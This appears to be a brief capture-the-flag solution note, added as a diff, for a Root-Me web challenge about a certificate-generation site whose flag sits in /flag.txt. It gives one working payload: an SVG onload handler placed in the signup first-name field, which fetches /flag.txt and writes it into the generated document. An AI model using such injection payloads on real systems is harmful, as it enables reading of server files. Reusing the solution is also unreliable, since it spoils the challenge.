@@ -1,0 +1,7 @@
+Challenge : This platform for issuing certificates of participation has just gone live.
+            The developers assure you that they have followed best practices and escaped all user inputs before using them in their code...
+            The flag is located in the `/flag.txt` file.
+Site : http://challenge01.root-me.org:59083/
+
+Payload on Signup page first name : <svg onload="var xhr = new XMLHttpRequest(); xhr.open('GET', '/flag.txt', false); xhr.send(); document.write(xhr.responseText);">
+Generate something and get the FLAG.
